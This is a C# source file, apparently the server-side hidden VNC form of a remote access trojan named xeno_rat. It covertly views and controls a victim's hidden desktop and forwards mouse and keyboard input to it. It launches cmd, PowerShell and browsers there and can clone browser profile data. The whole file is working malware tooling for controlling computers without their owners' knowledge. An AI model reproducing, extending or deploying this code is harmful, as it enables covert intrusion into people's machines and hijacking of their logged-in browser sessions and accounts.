using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Hvnc : Form
    {
        Node client;
        Node ImageNode;
        string DesktopName = "hidden_desktop";
        bool playing = false;
        bool is_clonning_browser = false;
        string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        CustomPictureBox customPictureBox1;
        public Hvnc(Node _client)
        {
            client = _client;
            InitializeComponent();
            InitializeAsync();
        }

        private async Task InitializeAsync()
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            client.AddTempOnDisconnect(TempOnDisconnect);
            await client.SendAsync(Encoding.UTF8.GetBytes(DesktopName));
            customPictureBox1 = new CustomPictureBox(client);
            customPictureBox1.Name = "pictureBox1";
            customPictureBox1.Size = pictureBox1.Size;
            customPictureBox1.Location = pictureBox1.Location;
            customPictureBox1.Image = pictureBox1.Image;
            customPictureBox1.SizeMode = pictureBox1.SizeMode;
            customPictureBox1.Anchor = pictureBox1.Anchor;
            Controls.Remove(pictureBox1);
            Controls.Add(customPictureBox1);
            comboBox1.Items.AddRange(qualitys);
            await RecvThread();
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            customPictureBox1.TriggerWndProc(ref msg);
            return true;
            //return base.ProcessCmdKey(ref msg, keyData);
        }
        public async Task start()
        {
            await client.SendAsync(new byte[] { 0 });
        }
        public  async Task stop()
        {
            await client.SendAsync(new byte[] { 1 });
        }
        public async Task SetQuality(int quality)
        {
            await client.SendAsync(new byte[] { 2 });
            await client.SendAsync(client.sock.IntToBytes(quality));
        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        public async Task RecvThread()
        {
            while (ImageNode.Connected())
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {
                        Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = Image.FromStream(ms);
                        }

                        customPictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (customPictureBox1.Image != null)
                            {
                                customPictureBox1.Image.Dispose();
                                customPictureBox1.Image = null;
                            }
                            customPictureBox1.Image = image;
                        }));
                    }
                    catch { }
                }
            }
        }


        private async Task StartProc(string path) 
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 5 });
            await client.SendAsync(Encoding.UTF8.GetBytes(path));
        }

        private async Task EnableBrowserClone() 
        {
            if (!playing || is_clonning_browser) return;
            await client.SendAsync(new byte[] { 6 });
            is_clonning_browser = true;
        }
        private async Task DisableBrowserClone()
        {
            if (!playing || !is_clonning_browser) return;
            await client.SendAsync(new byte[] { 7 });
            is_clonning_browser = false;
        }

        private async Task StartChrome() 
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 8 });
        }

        private async Task StartFirefox()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 9 });
        }

        private async Task StartEdge()
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 10 });
        }


        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        private void Hvnc_Load(object sender, EventArgs e)
        {

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            //start
            checkBox1.Enabled = true;
            await start();
            button1.Enabled = false;
            playing = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            //stop
            checkBox1.Enabled = false;
            await stop();
            button1.Enabled = true;
            playing = false;
            try
            {
                if (customPictureBox1.Image != null)
                {
                    customPictureBox1.Image.Dispose();
                    customPictureBox1.Image = null;
                }
            }
            catch { }
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
            }
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            if (!playing) return;
            await client.SendAsync(new byte[] { 4 });
        }

        private async void button4_Click(object sender, EventArgs e)
        {
            await StartProc(@"C:\Windows\System32\rundll32.exe shell32.dll,#61");
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            await StartEdge();
            if (is_clonning_browser) 
            {
               new Thread(()=>MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        private async void button6_Click(object sender, EventArgs e)
        {
            await StartChrome();
            if (is_clonning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        private async void button7_Click(object sender, EventArgs e)
        {
            await StartFirefox();
            if (is_clonning_browser)
            {
                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
            }
        }

        private async void button8_Click(object sender, EventArgs e)
        {
            await StartProc("cmd");
        }

        private async void button9_Click(object sender, EventArgs e)
        {
            await StartProc("powershell");
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private async void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (!playing) return;
            if (checkBox1.Checked)
            {
                await EnableBrowserClone();
            }
            else 
            {
                await DisableBrowserClone();
            }
        }
    }


    public class CustomPictureBox : PictureBox
    {
        Node client;
        public CustomPictureBox(Node _client) 
        {
            client = _client;
        }

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        // Constants for clipboard data formats
        public const uint CF_TEXT = 1;          // Text format
        public const uint CF_BITMAP = 2;        // Bitmap format
        public const uint CF_UNICODETEXT = 13;   // Unicode text format
        public const uint CF_HDROP = 15;         // File format

        // Import the necessary WinAPI functions
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        public static extern IntPtr GetClipboardData(uint uFormat);


        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        static extern short VkKeyScan(char c);

        [DllImport("user32.dll")]
        public static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, out uint lpChar, uint uFlags);
        public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
        {
            // Calculate the scaling factors
            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;

            // Apply the scaling factors
            int scaledX = (int)(originalCoords.X * scaleX);
            int scaledY = (int)(originalCoords.Y * scaleY);

            // Get the unzoomed and offset-adjusted coordinates
            Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));

            return translatedCoords;
        }
        public static void GetClipboardFormat()
        {
            if (!OpenClipboard(IntPtr.Zero))
                return;


            if (IsClipboardFormatAvailable(CF_TEXT))
            {
                IntPtr hGlobal = GetClipboardData(CF_TEXT);
                string clipboardText = Marshal.PtrToStringUni(hGlobal);
                Marshal.FreeHGlobal(hGlobal);
            }
            else if (IsClipboardFormatAvailable(CF_BITMAP))
            {
                IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                System.Drawing.Bitmap clipboardBitmap = System.Drawing.Bitmap.FromHbitmap(hBitmap);
                Marshal.FreeHGlobal(hBitmap);
            }
            else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
            {
                IntPtr hGlobal = GetClipboardData(CF_UNICODETEXT);
                string clipboardText = Marshal.PtrToStringUni(hGlobal);
                Marshal.FreeHGlobal(hGlobal);
            }

            CloseClipboard();
        }
        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
        {
            // Calculate the zoom factor
            float zoomFactor = Math.Min(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Get the displayed rectangle of the image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Offset and unzoom the coordinates
            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(translatedX, translatedY);
        }

        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
        {
            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
            {
                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
            }
            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
            {
                return pictureBox.ClientRectangle;
            }
            else
            {
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);

                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;

                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
            }
        }
        public static char GetModifiedKey(char c)
        {
            short vkKeyScanResult = VkKeyScan(c);

            // a result of -1 indicates no key translates to input character
            if (vkKeyScanResult == -1)
                return c;

            // vkKeyScanResult & 0xff is the base key, without any modifiers
            uint code = (uint)vkKeyScanResult & 0xff;
            // set shift key pressed
            byte[] b = new byte[256];
            b[0x10] = 0x80;

            uint r;
            // return value of 1 expected (1 character copied to r)
            if (1 != ToAscii(code, code, b, out r, 0))
                return c;

            return (char)r;
        }

        public static bool IsAlphaNumeric(char c)
        {
            return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '1' && c <= '9');
        }
        public void TriggerWndProc(ref Message m)
        {
            WndProc(ref m);
        }

        protected override void WndProc(ref Message m)
        {
            if (this.Image == null)
            {
                base.WndProc(ref m);
                return;
            }
            switch (m.Msg)
            {
                case 0x0201: // WM_LBUTTONDOWN
                case 0x0202: // WM_LBUTTONUP
                case 0x0204: // WM_RBUTTONDOWN
                case 0x0205: // WM_RBUTTONUP
                case 0x0207: // WM_MBUTTONDOWN
                case 0x0208: // WM_MBUTTONUP
                case 0x0203: // WM_LBUTTONDBLCLK
                case 0x0206: // WM_RBUTTONDBLCLK
                case 0x0209: // WM_MBUTTONDBLCLK
                case 0x0200: // WM_MOUSEMOVE
                case 0x020A: // WM_MOUSEWHEEL
                    int x = (int)(m.LParam.ToInt32() & 0xFFFF);
                    int y = (int)((m.LParam.ToInt32() >> 16) & 0xFFFF);
                    Point newpoint = TranslateCoordinates(new Point(x, y), this.Image.Size, this);
                    x = newpoint.X;
                    y = newpoint.Y;

                    m.LParam = (IntPtr)((y << 16) | (x & 0xFFFF));

                    uint msg = (uint)m.Msg;
                    IntPtr wParam = m.WParam;
                    IntPtr lParam = m.LParam;
                    int Imsg = (int)msg;
                    int IwParam = (int)wParam;
                    int IlParam = (int)lParam;
                    Task.Run(async () =>
                    {
                        await client.SendAsync(new byte[] { 3 });
                        await client.SendAsync(client.sock.IntToBytes(Imsg));
                        await client.SendAsync(client.sock.IntToBytes(IwParam));
                        await client.SendAsync(client.sock.IntToBytes(IlParam));
                    }).Wait();
                    break;

                case 0x0302: //WM_PASTE
                    break;

                case 0x0100: //WM_KEYDOWN
                case 0x0101: // WM_KEYUP
                    msg = (uint)m.Msg;
                    wParam = m.WParam;
                    lParam = m.LParam;

                    // Check if the Shift or Caps Lock key is pressed
                    bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                    bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                    if (isShiftPressed || isCapsLockOn)
                    {
                        // Modify the wParam to include the SHIFT or CAPSLOCK flag
                        const int VK_SHIFT = 0x10;
                        const int VK_CAPITAL = 0x14;

                        if (wParam.ToInt32() == VK_SHIFT || wParam.ToInt32() == VK_CAPITAL)
                        {
                            // Skip processing SHIFT or CAPSLOCK key release
                            break;
                        }

                        if (isShiftPressed)
                        {
                            msg = 0x0102;
                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
                            wParam = (IntPtr)Convert.ToInt32(GetModifiedKey((char)charCode));
                        }

                        if (isCapsLockOn)
                        {
                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
                            if (IsAlphaNumeric((char)charCode))
                            {
                                msg = 0x0102;
                            }

                        }
                    }
                    Imsg = (int)msg;
                    IwParam = (int)wParam;
                    IlParam = (int)lParam;
                    Task.Run(async () =>
                    {
                        await client.SendAsync(new byte[] { 3 });
                        await client.SendAsync(client.sock.IntToBytes(Imsg));
                        await client.SendAsync(client.sock.IntToBytes(IwParam));
                        await client.SendAsync(client.sock.IntToBytes(IlParam));
                    }).Wait();
                    break;
            }
            base.WndProc(ref m);
        }

    }
}
